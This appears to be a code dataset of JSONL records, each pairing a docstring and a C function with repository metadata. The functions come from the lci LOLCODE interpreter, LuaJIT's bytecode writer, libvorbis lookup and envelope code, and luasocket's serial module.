{"docstring": "/**\n * Interprets an expression statement.\n *\n * \\param [in] node The statement to interpret.\n *\n * \\param [in] scope The scope to evaluate \\a node under.\n *\n * \\pre \\a node contains a statement created by createExprNode().\n *\n * \\post The implicit variable of \\a scope will be set the the value of \\a node\n * evaluated under \\a scope.\n *\n * \\return A pointer to a default return value.\n *\n * \\retval NULL An error occurred during interpretation.\n */\n", "func_signal": "ReturnObject *interpretExprStmtNode(StmtNode *node,\n                                    ScopeObject *scope)", "code": "{\n\t/* Set the implicit variable to the result of the expression */\n\tExprNode *expr = (ExprNode *)node->stmt;\n\tdeleteValueObject(scope->impvar);\n\tscope->impvar = interpretExprNode(expr, scope);\n\tif (!scope->impvar) return NULL;\n\treturn createReturnObject(RT_DEFAULT, NULL);\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Interprets a logical NOT operation.\n *\n * \\param [in] expr A pointer to the expression to interpret.\n *\n * \\param [in] scope A pointer to a scope to evaluate \\a node under.\n *\n * \\note Only the first element of \\a args is used.\n *\n * \\return A pointer to the value of the logical negation of the first element\n * of \\a args.\n *\n * \\retval NULL An error occurred during interpretation.\n */\n", "func_signal": "ValueObject *interpretNotOpExprNode(OpExprNode *expr,\n                                    ScopeObject *scope)", "code": "{\n\tValueObject *val = interpretExprNode(expr->args->exprs[0], scope);\n\tValueObject *use = val;\n\tint retval;\n\tunsigned short cast = 0;\n\tif (!val) return NULL;\n\tif (val->type != VT_BOOLEAN && val->type != VT_INTEGER) {\n\t\tuse = castBooleanImplicit(val, scope);\n\t\tif (!use) {\n\t\t\tdeleteValueObject(val);\n\t\t\treturn NULL;\n\t\t}\n\t\tcast = 1;\n\t}\n\tretval = getInteger(use);\n\tif (cast) deleteValueObject(use);\n\tdeleteValueObject(val);\n\treturn createBooleanValueObject(!retval);\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Creates a new, nil-type value in a scope.\n *\n * \\param [in] src The scope to evaluate \\a target under.\n *\n * \\param [in,out] dest The scope to create the new value in.\n *\n * \\param [in] target The name of the value to create.\n *\n * \\return The newly-created value.\n *\n * \\retval NULL Memory allocation failed.\n */\n", "func_signal": "ValueObject *createScopeValue(ScopeObject *src,\n                              ScopeObject *dest,\n                              IdentifierNode *target)", "code": "{\n\tScopeObject *parent = dest;\n\tIdentifierNode *child = target;\n\tint status;\n\tunsigned int newnumvals;\n\tvoid *mem1 = NULL;\n\tvoid *mem2 = NULL;\n\tchar *name = NULL;\n\n\t/* Traverse the target to the terminal child and parent */\n\tstatus = resolveTerminalSlot(src, dest, target, &parent, &child);\n\tif (!status) goto createScopeValueAbort;\n\n\t/* Store the new number of values */\n\tnewnumvals = dest->numvals + 1;\n\n\t/* Look up the identifier name */\n\tname = resolveIdentifierName(target, src);\n\tif (!name) goto createScopeValueAbort;\n\n\t/* Add value to local scope */\n\tmem1 = realloc(dest->names, sizeof(IdentifierNode *) * newnumvals);\n\tif (!mem1) {\n\t\tperror(\"realloc\");\n\t\tgoto createScopeValueAbort;\n\t}\n\tmem2 = realloc(dest->values, sizeof(ValueObject *) * newnumvals);\n\tif (!mem2) {\n\t\tperror(\"realloc\");\n\t\tgoto createScopeValueAbort;\n\t}\n\n\tdest->names = mem1;\n\tdest->values = mem2;\n\tdest->names[dest->numvals] = name;\n\tdest->values[dest->numvals] = createNilValueObject();\n\tif (!dest->values[dest->numvals]) goto createScopeValueAbort;\n\tdest->numvals = newnumvals;\n\n\treturn dest->values[dest->numvals - 1];\n\ncreateScopeValueAbort: /* In case something goes wrong... */\n\n\t/* Clean up any allocated structures */\n\tif (name) free(name);\n\tif (mem1) free(mem1);\n\tif (mem2) free(mem2);\n\n\treturn NULL;\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Checks if a string follows the format of a hexadecimal number.\n *\n * \\param [in] data The characters to check the format of.\n *\n * \\retval 0 The string is not a hexadecimal number.\n *\n * \\retval 1 The string is a hexadecimal number.\n */\n", "func_signal": "unsigned int isHexString(const char *data)", "code": "{\n\tsize_t n;\n\tsize_t len = strlen(data);\n\n\t/* Check for empty string */\n\tif (len == 0) return 0;\n\n\t/* Check for non-digit and non-A-through-F characters */\n\tfor (n = 0; n < len; n++) {\n\t\tif (!isdigit(data[n])\n\t\t\t\t&& data[n] != 'A'\n\t\t\t\t&& data[n] != 'B'\n\t\t\t\t&& data[n] != 'C'\n\t\t\t\t&& data[n] != 'D'\n\t\t\t\t&& data[n] != 'E'\n\t\t\t\t&& data[n] != 'F'\n\t\t\t\t&& data[n] != 'a'\n\t\t\t\t&& data[n] != 'b'\n\t\t\t\t&& data[n] != 'c'\n\t\t\t\t&& data[n] != 'd'\n\t\t\t\t&& data[n] != 'e'\n\t\t\t\t&& data[n] != 'f')\n\t\t\treturn 0;\n\t}\n\n\treturn 1;\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/* Write prototype. */\n", "func_signal": "static void bcwrite_proto(BCWriteCtx *ctx, GCproto *pt)", "code": "{\n  MSize sizedbg = 0;\n  char *p;\n\n  /* Recursively write children of prototype. */\n  if ((pt->flags & PROTO_CHILD)) {\n    ptrdiff_t i, n = pt->sizekgc;\n    GCRef *kr = mref(pt->k, GCRef) - 1;\n    for (i = 0; i < n; i++, kr--) {\n      GCobj *o = gcref(*kr);\n      if (o->gch.gct == ~LJ_TPROTO)\n\tbcwrite_proto(ctx, gco2pt(o));\n    }\n  }\n\n  /* Start writing the prototype info to a buffer. */\n  p = lj_buf_need(&ctx->sb,\n\t\t  5+4+6*5+(pt->sizebc-1)*(MSize)sizeof(BCIns)+pt->sizeuv*2);\n  p += 5;  /* Leave room for final size. */\n\n  /* Write prototype header. */\n  *p++ = (pt->flags & (PROTO_CHILD|PROTO_VARARG|PROTO_FFI));\n  *p++ = pt->numparams;\n  *p++ = pt->framesize;\n  *p++ = pt->sizeuv;\n  p = lj_strfmt_wuleb128(p, pt->sizekgc);\n  p = lj_strfmt_wuleb128(p, pt->sizekn);\n  p = lj_strfmt_wuleb128(p, pt->sizebc-1);\n  if (!ctx->strip) {\n    if (proto_lineinfo(pt))\n      sizedbg = pt->sizept - (MSize)((char *)proto_lineinfo(pt) - (char *)pt);\n    p = lj_strfmt_wuleb128(p, sizedbg);\n    if (sizedbg) {\n      p = lj_strfmt_wuleb128(p, pt->firstline);\n      p = lj_strfmt_wuleb128(p, pt->numline);\n    }\n  }\n\n  /* Write bytecode instructions and upvalue refs. */\n  p = bcwrite_bytecode(ctx, p, pt);\n  p = lj_buf_wmem(p, proto_uv(pt), pt->sizeuv*2);\n  setsbufP(&ctx->sb, p);\n\n  /* Write constants. */\n  bcwrite_kgc(ctx, pt);\n  bcwrite_knum(ctx, pt);\n\n  /* Write debug info, if not stripped. */\n  if (sizedbg) {\n    p = lj_buf_more(&ctx->sb, sizedbg);\n    p = lj_buf_wmem(p, proto_lineinfo(pt), sizedbg);\n    setsbufP(&ctx->sb, p);\n  }\n\n  /* Pass buffer to writer function. */\n  if (ctx->status == 0) {\n    MSize n = sbuflen(&ctx->sb) - 5;\n    MSize nn = (lj_fls(n)+8)*9 >> 6;\n    char *q = sbufB(&ctx->sb) + (5 - nn);\n    p = lj_strfmt_wuleb128(q, n);  /* Fill in final size. */\n    lj_assertBCW(p == sbufB(&ctx->sb) + 5, \"bad ULEB128 write\");\n    ctx->status = ctx->wfunc(sbufL(&ctx->sb), q, nn+n, ctx->wdata);\n  }\n}", "path": "Quick-Cocos2dx-Community/external/lua/luajit/src/src/lj_bcwrite.c", "commit_date": "2020-07-26 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* interpolated lookup based cos function, domain 0 to PI only */\n/* a is in 0.16 format, where 0==0, 2^^16-1==PI, return 0.14 */\n", "func_signal": "long vorbis_coslook_i(long a)", "code": "{\n  int i=a>>COS_LOOKUP_I_SHIFT;\n  int d=a&COS_LOOKUP_I_MASK;\n  return COS_LOOKUP_I[i]- ((d*(COS_LOOKUP_I[i]-COS_LOOKUP_I[i+1]))>>\n                           COS_LOOKUP_I_SHIFT);\n}", "path": "Quick-Cocos2dx-Community/cocos/audio/libvorbis/lib/lookup.c", "commit_date": "2019-05-15 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/*-------------------------------------------------------------------------*\\\n* Creates a serial object \n\\*-------------------------------------------------------------------------*/\n", "func_signal": "static int global_create(lua_State *L)", "code": "{\n    const char* path = luaL_checkstring(L, 1);\n\n    /* allocate unix object */\n    p_unix un = (p_unix) lua_newuserdata(L, sizeof(t_unix));\n\n    /* open serial device */\n    t_socket sock = open(path, O_NOCTTY|O_RDWR);\n\n    /*printf(\"open %s on %d\\n\", path, sock);*/\n\n    if (sock < 0)  {\n        lua_pushnil(L);\n        lua_pushstring(L, socket_strerror(errno));\n        lua_pushnumber(L, errno);\n        return 3;\n    }\n    /* set its type as client object */\n    auxiliar_setclass(L, \"serial{client}\", -1);\n    /* initialize remaining structure fields */\n    socket_setnonblocking(&sock);\n    un->sock = sock;\n    io_init(&un->io, (p_send) socket_write, (p_recv) socket_read, \n            (p_error) socket_ioerror, &un->sock);\n    timeout_init(&un->tm, -1, -1);\n    buffer_init(&un->buf, &un->io, &un->tm);\n    return 1;\n}", "path": "Quick-Cocos2dx-Community/external/lua/luasocket/serial.c", "commit_date": "2015-09-07 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* interpolated lookup based fromdB function, domain -140dB to 0dB only */\n", "func_signal": "float vorbis_fromdBlook(float a)", "code": "{\n  int i=vorbis_ftoi(a*((float)(-(1<<FROMdB2_SHIFT)))-.5f);\n  return (i<0)?1.f:\n    ((i>=(FROMdB_LOOKUP_SZ<<FROMdB_SHIFT))?0.f:\n     FROMdB_LOOKUP[i>>FROMdB_SHIFT]*FROMdB2_LOOKUP[i&FROMdB2_MASK]);\n}", "path": "Quick-Cocos2dx-Community/cocos/audio/libvorbis/lib/lookup.c", "commit_date": "2019-05-15 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* Write GC constants of a prototype. */\n", "func_signal": "static void bcwrite_kgc(BCWriteCtx *ctx, GCproto *pt)", "code": "{\n  MSize i, sizekgc = pt->sizekgc;\n  GCRef *kr = mref(pt->k, GCRef) - (ptrdiff_t)sizekgc;\n  for (i = 0; i < sizekgc; i++, kr++) {\n    GCobj *o = gcref(*kr);\n    MSize tp, need = 1;\n    char *p;\n    /* Determine constant type and needed size. */\n    if (o->gch.gct == ~LJ_TSTR) {\n      tp = BCDUMP_KGC_STR + gco2str(o)->len;\n      need = 5+gco2str(o)->len;\n    } else if (o->gch.gct == ~LJ_TPROTO) {\n      lj_assertBCW((pt->flags & PROTO_CHILD), \"prototype has unexpected child\");\n      tp = BCDUMP_KGC_CHILD;\n#if LJ_HASFFI\n    } else if (o->gch.gct == ~LJ_TCDATA) {\n      CTypeID id = gco2cd(o)->ctypeid;\n      need = 1+4*5;\n      if (id == CTID_INT64) {\n\ttp = BCDUMP_KGC_I64;\n      } else if (id == CTID_UINT64) {\n\ttp = BCDUMP_KGC_U64;\n      } else {\n\tlj_assertBCW(id == CTID_COMPLEX_DOUBLE,\n\t\t     \"bad cdata constant CTID %d\", id);\n\ttp = BCDUMP_KGC_COMPLEX;\n      }\n#endif\n    } else {\n      lj_assertBCW(o->gch.gct == ~LJ_TTAB,\n\t\t   \"bad constant GC type %d\", o->gch.gct);\n      tp = BCDUMP_KGC_TAB;\n      need = 1+2*5;\n    }\n    /* Write constant type. */\n    p = lj_buf_more(&ctx->sb, need);\n    p = lj_strfmt_wuleb128(p, tp);\n    /* Write constant data (if any). */\n    if (tp >= BCDUMP_KGC_STR) {\n      p = lj_buf_wmem(p, strdata(gco2str(o)), gco2str(o)->len);\n    } else if (tp == BCDUMP_KGC_TAB) {\n      bcwrite_ktab(ctx, p, gco2tab(o));\n      continue;\n#if LJ_HASFFI\n    } else if (tp != BCDUMP_KGC_CHILD) {\n      cTValue *q = (TValue *)cdataptr(gco2cd(o));\n      p = lj_strfmt_wuleb128(p, q[0].u32.lo);\n      p = lj_strfmt_wuleb128(p, q[0].u32.hi);\n      if (tp == BCDUMP_KGC_COMPLEX) {\n\tp = lj_strfmt_wuleb128(p, q[1].u32.lo);\n\tp = lj_strfmt_wuleb128(p, q[1].u32.hi);\n      }\n#endif\n    }\n    setsbufP(&ctx->sb, p);\n  }\n}", "path": "Quick-Cocos2dx-Community/external/lua/luajit/src/src/lj_bcwrite.c", "commit_date": "2020-07-26 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/*-------------------------------------------------------------------------*\\\n* Initializes module\n\\*-------------------------------------------------------------------------*/\n", "func_signal": "LUASOCKET_API int luaopen_socket_serial(lua_State *L)", "code": "{\n    /* create classes */\n    auxiliar_newclass(L, \"serial{client}\", serial_methods);\n    /* create class groups */\n    auxiliar_add2group(L, \"serial{client}\", \"serial{any}\");\n#if LUA_VERSION_NUM > 501 && !defined(LUA_COMPAT_MODULE)\n    lua_pushcfunction(L, global_create);\n    (void) func;\n#else\n    /* set function into socket namespace */\n    luaL_openlib(L, \"socket\", func, 0);\n    lua_pushcfunction(L, global_create);\n#endif\n    return 1;\n}", "path": "Quick-Cocos2dx-Community/external/lua/luasocket/serial.c", "commit_date": "2015-09-07 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* this is very dangerous, but can be handy for those that are brave enough */\n", "func_signal": "static int meth_setfd(lua_State *L)", "code": "{\n    p_unix un = (p_unix) auxiliar_checkgroup(L, \"serial{any}\", 1);\n    un->sock = (t_socket) luaL_checknumber(L, 2); \n    return 0;\n}", "path": "Quick-Cocos2dx-Community/external/lua/luasocket/serial.c", "commit_date": "2015-09-07 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/*=========================================================================*\\\n* Lua methods\n\\*=========================================================================*/\n/*-------------------------------------------------------------------------*\\\n* Just call buffered IO methods\n\\*-------------------------------------------------------------------------*/\n", "func_signal": "static int meth_send(lua_State *L)", "code": "{\n    p_unix un = (p_unix) auxiliar_checkclass(L, \"serial{client}\", 1);\n    return buffer_meth_send(L, &un->buf);\n}", "path": "Quick-Cocos2dx-Community/external/lua/luasocket/serial.c", "commit_date": "2015-09-07 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* interpolated lookup based cos function, domain 0 to PI only */\n", "func_signal": "float vorbis_coslook(float a)", "code": "{\n  double d=a*(.31830989*(float)COS_LOOKUP_SZ);\n  int i=vorbis_ftoi(d-.5);\n\n  return COS_LOOKUP[i]+ (d-i)*(COS_LOOKUP[i+1]-COS_LOOKUP[i]);\n}", "path": "Quick-Cocos2dx-Community/cocos/audio/libvorbis/lib/lookup.c", "commit_date": "2019-05-15 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* Write bytecode for a prototype. */\n", "func_signal": "int lj_bcwrite(lua_State *L, GCproto *pt, lua_Writer writer, void *data,\n\t      int strip)", "code": "{\n  BCWriteCtx ctx;\n  int status;\n  ctx.pt = pt;\n  ctx.wfunc = writer;\n  ctx.wdata = data;\n  ctx.strip = strip;\n  ctx.status = 0;\n#ifdef LUA_USE_ASSERT\n  ctx.g = G(L);\n#endif\n  lj_buf_init(L, &ctx.sb);\n  status = lj_vm_cpcall(L, NULL, &ctx, cpwriter);\n  if (status == 0) status = ctx.status;\n  lj_buf_free(G(sbufL(&ctx.sb)), &ctx.sb);\n  return status;\n}", "path": "Quick-Cocos2dx-Community/external/lua/luajit/src/src/lj_bcwrite.c", "commit_date": "2020-07-26 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* interpolated lookup based fromdB function, domain -140dB to 0dB only */\n/* a is in n.12 format */\n", "func_signal": "float vorbis_fromdBlook_i(long a)", "code": "{\n  int i=(-a)>>(12-FROMdB2_SHIFT);\n  return (i<0)?1.f:\n    ((i>=(FROMdB_LOOKUP_SZ<<FROMdB_SHIFT))?0.f:\n     FROMdB_LOOKUP[i>>FROMdB_SHIFT]*FROMdB2_LOOKUP[i&FROMdB2_MASK]);\n}", "path": "Quick-Cocos2dx-Community/cocos/audio/libvorbis/lib/lookup.c", "commit_date": "2019-05-15 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* interpolated 1./sqrt(p) where .5 <= p < 1. */\n", "func_signal": "float vorbis_invsqlook(float a)", "code": "{\n  double d=a*(2.f*(float)INVSQ_LOOKUP_SZ)-(float)INVSQ_LOOKUP_SZ;\n  int i=vorbis_ftoi(d-.5f);\n  return INVSQ_LOOKUP[i]+ (d-i)*(INVSQ_LOOKUP[i+1]-INVSQ_LOOKUP[i]);\n}", "path": "Quick-Cocos2dx-Community/cocos/audio/libvorbis/lib/lookup.c", "commit_date": "2019-05-15 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* fairly straight threshhold-by-band based until we find something\n   that works better and isn't patented. */\n", "func_signal": "static int _ve_amp(envelope_lookup *ve,\n                   vorbis_info_psy_global *gi,\n                   float *data,\n                   envelope_band *bands,\n                   envelope_filter_state *filters)", "code": "{\n  long n=ve->winlength;\n  int ret=0;\n  long i,j;\n  float decay;\n\n  /* we want to have a 'minimum bar' for energy, else we're just\n     basing blocks on quantization noise that outweighs the signal\n     itself (for low power signals) */\n\n  float minV=ve->minenergy;\n  float *vec=alloca(n*sizeof(*vec));\n\n  /* stretch is used to gradually lengthen the number of windows\n     considered prevoius-to-potential-trigger */\n  int stretch=max(VE_MINSTRETCH,ve->stretch/2);\n  float penalty=gi->stretch_penalty-(ve->stretch/2-VE_MINSTRETCH);\n  if(penalty<0.f)penalty=0.f;\n  if(penalty>gi->stretch_penalty)penalty=gi->stretch_penalty;\n\n  /*_analysis_output_always(\"lpcm\",seq2,data,n,0,0,\n    totalshift+pos*ve->searchstep);*/\n\n /* window and transform */\n  for(i=0;i<n;i++)\n    vec[i]=data[i]*ve->mdct_win[i];\n  mdct_forward(&ve->mdct,vec,vec);\n\n  /*_analysis_output_always(\"mdct\",seq2,vec,n/2,0,1,0); */\n\n  /* near-DC spreading function; this has nothing to do with\n     psychoacoustics, just sidelobe leakage and window size */\n  {\n    float temp=vec[0]*vec[0]+.7*vec[1]*vec[1]+.2*vec[2]*vec[2];\n    int ptr=filters->nearptr;\n\n    /* the accumulation is regularly refreshed from scratch to avoid\n       floating point creep */\n    if(ptr==0){\n      decay=filters->nearDC_acc=filters->nearDC_partialacc+temp;\n      filters->nearDC_partialacc=temp;\n    }else{\n      decay=filters->nearDC_acc+=temp;\n      filters->nearDC_partialacc+=temp;\n    }\n    filters->nearDC_acc-=filters->nearDC[ptr];\n    filters->nearDC[ptr]=temp;\n\n    decay*=(1./(VE_NEARDC+1));\n    filters->nearptr++;\n    if(filters->nearptr>=VE_NEARDC)filters->nearptr=0;\n    decay=todB(&decay)*.5-15.f;\n  }\n\n  /* perform spreading and limiting, also smooth the spectrum.  yes,\n     the MDCT results in all real coefficients, but it still *behaves*\n     like real/imaginary pairs */\n  for(i=0;i<n/2;i+=2){\n    float val=vec[i]*vec[i]+vec[i+1]*vec[i+1];\n    val=todB(&val)*.5f;\n    if(val<decay)val=decay;\n    if(val<minV)val=minV;\n    vec[i>>1]=val;\n    decay-=8.;\n  }\n\n  /*_analysis_output_always(\"spread\",seq2++,vec,n/4,0,0,0);*/\n\n  /* perform preecho/postecho triggering by band */\n  for(j=0;j<VE_BANDS;j++){\n    float acc=0.;\n    float valmax,valmin;\n\n    /* accumulate amplitude */\n    for(i=0;i<bands[j].end;i++)\n      acc+=vec[i+bands[j].begin]*bands[j].window[i];\n\n    acc*=bands[j].total;\n\n    /* convert amplitude to delta */\n    {\n      int p,this=filters[j].ampptr;\n      float postmax,postmin,premax=-99999.f,premin=99999.f;\n\n      p=this;\n      p--;\n      if(p<0)p+=VE_AMP;\n      postmax=max(acc,filters[j].ampbuf[p]);\n      postmin=min(acc,filters[j].ampbuf[p]);\n\n      for(i=0;i<stretch;i++){\n        p--;\n        if(p<0)p+=VE_AMP;\n        premax=max(premax,filters[j].ampbuf[p]);\n        premin=min(premin,filters[j].ampbuf[p]);\n      }\n\n      valmin=postmin-premin;\n      valmax=postmax-premax;\n\n      /*filters[j].markers[pos]=valmax;*/\n      filters[j].ampbuf[this]=acc;\n      filters[j].ampptr++;\n      if(filters[j].ampptr>=VE_AMP)filters[j].ampptr=0;\n    }\n\n    /* look at min/max, decide trigger */\n    if(valmax>gi->preecho_thresh[j]+penalty){\n      ret|=1;\n      ret|=4;\n    }\n    if(valmin<gi->postecho_thresh[j]-penalty)ret|=2;\n  }\n\n  return(ret);\n}", "path": "Quick-Cocos2dx-Community/cocos/audio/libvorbis/lib/envelope.c", "commit_date": "2019-05-15 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* Write header of bytecode dump. */\n", "func_signal": "static void bcwrite_header(BCWriteCtx *ctx)", "code": "{\n  GCstr *chunkname = proto_chunkname(ctx->pt);\n  const char *name = strdata(chunkname);\n  MSize len = chunkname->len;\n  char *p = lj_buf_need(&ctx->sb, 5+5+len);\n  *p++ = BCDUMP_HEAD1;\n  *p++ = BCDUMP_HEAD2;\n  *p++ = BCDUMP_HEAD3;\n  *p++ = BCDUMP_VERSION;\n  *p++ = (ctx->strip ? BCDUMP_F_STRIP : 0) +\n\t LJ_BE*BCDUMP_F_BE +\n\t ((ctx->pt->flags & PROTO_FFI) ? BCDUMP_F_FFI : 0) +\n\t LJ_FR2*BCDUMP_F_FR2;\n  if (!ctx->strip) {\n    p = lj_strfmt_wuleb128(p, len);\n    p = lj_buf_wmem(p, name, len);\n  }\n  ctx->status = ctx->wfunc(sbufL(&ctx->sb), sbufB(&ctx->sb),\n\t\t\t   (MSize)(p - sbufB(&ctx->sb)), ctx->wdata);\n}", "path": "Quick-Cocos2dx-Community/external/lua/luajit/src/src/lj_bcwrite.c", "commit_date": "2020-07-26 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* interpolated 1./sqrt(p) where .5 <= a < 1. (.100000... to .111111...) in\n   16.16 format\n\n   returns in m.8 format */\n", "func_signal": "long vorbis_invsqlook_i(long a,long e)", "code": "{\n  long i=(a&0x7fff)>>(INVSQ_LOOKUP_I_SHIFT-1);\n  long d=(a&INVSQ_LOOKUP_I_MASK)<<(16-INVSQ_LOOKUP_I_SHIFT); /*  0.16 */\n  long val=INVSQ_LOOKUP_I[i]-                                /*  1.16 */\n    (((INVSQ_LOOKUP_I[i]-INVSQ_LOOKUP_I[i+1])*               /*  0.16 */\n      d)>>16);                                               /* result 1.16 */\n\n  e+=32;\n  if(e&1)val=(val*5792)>>13; /* multiply val by 1/sqrt(2) */\n  e=(e>>1)-8;\n\n  return(val>>e);\n}", "path": "Quick-Cocos2dx-Community/cocos/audio/libvorbis/lib/lookup.c", "commit_date": "2019-05-15 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* Write a single constant key/value of a template table. */\n", "func_signal": "static void bcwrite_ktabk(BCWriteCtx *ctx, cTValue *o, int narrow)", "code": "{\n  char *p = lj_buf_more(&ctx->sb, 1+10);\n  if (tvisstr(o)) {\n    const GCstr *str = strV(o);\n    MSize len = str->len;\n    p = lj_buf_more(&ctx->sb, 5+len);\n    p = lj_strfmt_wuleb128(p, BCDUMP_KTAB_STR+len);\n    p = lj_buf_wmem(p, strdata(str), len);\n  } else if (tvisint(o)) {\n    *p++ = BCDUMP_KTAB_INT;\n    p = lj_strfmt_wuleb128(p, intV(o));\n  } else if (tvisnum(o)) {\n    if (!LJ_DUALNUM && narrow) {  /* Narrow number constants to integers. */\n      lua_Number num = numV(o);\n      int32_t k = lj_num2int(num);\n      if (num == (lua_Number)k) {  /* -0 is never a constant. */\n\t*p++ = BCDUMP_KTAB_INT;\n\tp = lj_strfmt_wuleb128(p, k);\n\tsetsbufP(&ctx->sb, p);\n\treturn;\n      }\n    }\n    *p++ = BCDUMP_KTAB_NUM;\n    p = lj_strfmt_wuleb128(p, o->u32.lo);\n    p = lj_strfmt_wuleb128(p, o->u32.hi);\n  } else {\n    lj_assertBCW(tvispri(o), \"unhandled type %d\", itype(o));\n    *p++ = BCDUMP_KTAB_NIL+~itype(o);\n  }\n  setsbufP(&ctx->sb, p);\n}", "path": "Quick-Cocos2dx-Community/external/lua/luajit/src/src/lj_bcwrite.c", "commit_date": "2020-07-26 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* Write bytecode instructions. */\n", "func_signal": "static char *bcwrite_bytecode(BCWriteCtx *ctx, char *p, GCproto *pt)", "code": "{\n  MSize nbc = pt->sizebc-1;  /* Omit the [JI]FUNC* header. */\n#if LJ_HASJIT\n  uint8_t *q = (uint8_t *)p;\n#endif\n  p = lj_buf_wmem(p, proto_bc(pt)+1, nbc*(MSize)sizeof(BCIns));\n  UNUSED(ctx);\n#if LJ_HASJIT\n  /* Unpatch modified bytecode containing ILOOP/JLOOP etc. */\n  if ((pt->flags & PROTO_ILOOP) || pt->trace) {\n    jit_State *J = L2J(sbufL(&ctx->sb));\n    MSize i;\n    for (i = 0; i < nbc; i++, q += sizeof(BCIns)) {\n      BCOp op = (BCOp)q[LJ_ENDIAN_SELECT(0, 3)];\n      if (op == BC_IFORL || op == BC_IITERL || op == BC_ILOOP ||\n\t  op == BC_JFORI) {\n\tq[LJ_ENDIAN_SELECT(0, 3)] = (uint8_t)(op-BC_IFORL+BC_FORL);\n      } else if (op == BC_JFORL || op == BC_JITERL || op == BC_JLOOP) {\n\tBCReg rd = q[LJ_ENDIAN_SELECT(2, 1)] + (q[LJ_ENDIAN_SELECT(3, 0)] << 8);\n\tmemcpy(q, &traceref(J, rd)->startins, 4);\n      }\n    }\n  }\n#endif\n  return p;\n}", "path": "Quick-Cocos2dx-Community/external/lua/luajit/src/src/lj_bcwrite.c", "commit_date": "2020-07-26 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* Write footer of bytecode dump. */\n", "func_signal": "static void bcwrite_footer(BCWriteCtx *ctx)", "code": "{\n  if (ctx->status == 0) {\n    uint8_t zero = 0;\n    ctx->status = ctx->wfunc(sbufL(&ctx->sb), &zero, 1, ctx->wdata);\n  }\n}", "path": "Quick-Cocos2dx-Community/external/lua/luajit/src/src/lj_bcwrite.c", "commit_date": "2020-07-26 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
{"docstring": "/* Write a template table. */\n", "func_signal": "static void bcwrite_ktab(BCWriteCtx *ctx, char *p, const GCtab *t)", "code": "{\n  MSize narray = 0, nhash = 0;\n  if (t->asize > 0) {  /* Determine max. length of array part. */\n    ptrdiff_t i;\n    TValue *array = tvref(t->array);\n    for (i = (ptrdiff_t)t->asize-1; i >= 0; i--)\n      if (!tvisnil(&array[i]))\n\tbreak;\n    narray = (MSize)(i+1);\n  }\n  if (t->hmask > 0) {  /* Count number of used hash slots. */\n    MSize i, hmask = t->hmask;\n    Node *node = noderef(t->node);\n    for (i = 0; i <= hmask; i++)\n      nhash += !tvisnil(&node[i].val);\n  }\n  /* Write number of array slots and hash slots. */\n  p = lj_strfmt_wuleb128(p, narray);\n  p = lj_strfmt_wuleb128(p, nhash);\n  setsbufP(&ctx->sb, p);\n  if (narray) {  /* Write array entries (may contain nil). */\n    MSize i;\n    TValue *o = tvref(t->array);\n    for (i = 0; i < narray; i++, o++)\n      bcwrite_ktabk(ctx, o, 1);\n  }\n  if (nhash) {  /* Write hash entries. */\n    MSize i = nhash;\n    Node *node = noderef(t->node) + t->hmask;\n    for (;; node--)\n      if (!tvisnil(&node->val)) {\n\tbcwrite_ktabk(ctx, &node->key, 0);\n\tbcwrite_ktabk(ctx, &node->val, 1);\n\tif (--i == 0) break;\n      }\n  }\n}", "path": "Quick-Cocos2dx-Community/external/lua/luajit/src/src/lj_bcwrite.c", "commit_date": "2020-07-26 00:00:00", "repo_name": "u0u0/Quick-Cocos2dx-Community", "stars": 551, "license": "None", "language": "c", "size": 387620}
